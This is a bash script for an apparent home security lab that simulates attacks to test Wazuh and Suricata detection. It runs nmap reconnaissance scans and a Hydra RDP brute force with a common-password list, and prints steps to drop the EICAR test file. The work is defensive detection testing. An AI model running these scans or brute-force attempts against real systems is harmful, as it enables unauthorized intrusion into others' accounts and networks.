#!/bin/bash
# ================================================================
#  CyberForge - Attack Simulation Scripts
#  Author: KAOUANE WALID
#
#  Run from Kali Linux to simulate the three attack scenarios.
#  WARNING: Only use in an isolated lab environment.
#
#  Usage:
#    chmod +x simulate-attacks.sh
#    ./simulate-attacks.sh <TARGET_IP>
# ================================================================

TARGET_IP="${1:-192.168.1.100}"

RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

banner() {
    echo ""
    echo -e "${RED}================================================================${NC}"
    echo -e "${RED}  CyberForge Attack Simulation${NC}"
    echo -e "${RED}  Author: KAOUANE WALID${NC}"
    echo -e "${RED}  Target: ${TARGET_IP}${NC}"
    echo -e "${RED}  WARNING: Isolated lab use only${NC}"
    echo -e "${RED}================================================================${NC}"
    echo ""
}

scenario1_recon() {
    echo -e "${BLUE}[SCENARIO 1] Network Reconnaissance - Nmap Scan${NC}"
    echo "-----------------------------------------------------------"
    echo "Objective: Trigger Suricata IDS alerts in Wazuh"
    echo ""

    # SYN scan (stealthy)
    echo -e "${YELLOW}  Running SYN scan (-sS)...${NC}"
    nmap -sS -T4 -p 1-1000 "${TARGET_IP}" -oN /tmp/cyberforge_scan_syn.txt

    sleep 2

    # Service version detection
    echo -e "${YELLOW}  Running service detection (-sV)...${NC}"
    nmap -sV -T4 -p 22,80,443,3389 "${TARGET_IP}" -oN /tmp/cyberforge_scan_sv.txt

    sleep 2

    # OS fingerprinting
    echo -e "${YELLOW}  Running OS detection (-O)...${NC}"
    sudo nmap -O "${TARGET_IP}" -oN /tmp/cyberforge_scan_os.txt

    echo ""
    echo -e "${GREEN}  [DONE] Scenario 1 complete. Check Wazuh for Suricata alerts.${NC}"
    echo "  Expected rule IDs: 100001, 100002, 100003"
    echo ""
}

scenario2_rdp_bruteforce() {
    echo -e "${BLUE}[SCENARIO 2] RDP Brute Force - Hydra${NC}"
    echo "-----------------------------------------------------------"
    echo "Objective: Trigger Wazuh Rule 60204 → Auto IP block for 600s"
    echo ""

    # Create a small password list for testing
    cat > /tmp/test_passwords.txt << EOF
password
Password1
123456
admin
administrator
letmein
welcome
P@ssw0rd
Passw0rd!
EOF

    echo -e "${YELLOW}  Launching Hydra RDP brute force...${NC}"
    hydra -l Administrator \
          -P /tmp/test_passwords.txt \
          -t 4 \
          -W 3 \
          rdp://"${TARGET_IP}" \
          -V \
          2>&1 | head -40

    echo ""
    echo -e "${GREEN}  [DONE] Scenario 2 complete. Check Wazuh for brute force alerts.${NC}"
    echo "  Expected rule IDs: 100010, 100011, 100012"
    echo "  Expected response: Your IP should be blocked for 600 seconds"
    echo ""
}

scenario3_malware_drop() {
    echo -e "${BLUE}[SCENARIO 3] Malware Drop - EICAR Test File${NC}"
    echo "-----------------------------------------------------------"
    echo "Objective: Trigger FIM → VirusTotal → Auto file deletion"
    echo ""
    echo "  This scenario requires manual action on the Windows Server:"
    echo ""
    echo -e "${YELLOW}  Steps to execute on Windows Server:${NC}"
    echo "  1. Open PowerShell as Administrator"
    echo "  2. Run the following command:"
    echo ""
    echo '  $eicar = "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"'
    echo '  Set-Content -Path "C:\Users\Public\Downloads\test_malware.txt" -Value $eicar'
    echo ""
    echo "  3. Wazuh FIM will detect the new file within 60 seconds"
    echo "  4. Hash will be submitted to VirusTotal"
    echo "  5. VirusTotal will return a positive verdict"
    echo "  6. delete_malware.exe will remove the file automatically"
    echo ""
    echo -e "${GREEN}  [INFO] Scenario 3 requires Windows Server access to simulate.${NC}"
    echo "  Expected rule IDs: 100020, 100021, 100022"
    echo ""
}

# ----------------------------------------------------------------
# Main
# ----------------------------------------------------------------
banner

echo "Select scenario to simulate:"
echo "  1) Network Reconnaissance (Nmap)"
echo "  2) RDP Brute Force (Hydra)"
echo "  3) Malware Drop (EICAR)"
echo "  4) Run ALL scenarios"
echo ""
read -rp "Choice [1-4]: " CHOICE

case "$CHOICE" in
    1) scenario1_recon ;;
    2) scenario2_rdp_bruteforce ;;
    3) scenario3_malware_drop ;;
    4)
        scenario1_recon
        sleep 5
        scenario2_rdp_bruteforce
        sleep 5
        scenario3_malware_drop
        ;;
    *)
        echo "Invalid choice."
        exit 1
        ;;
esac
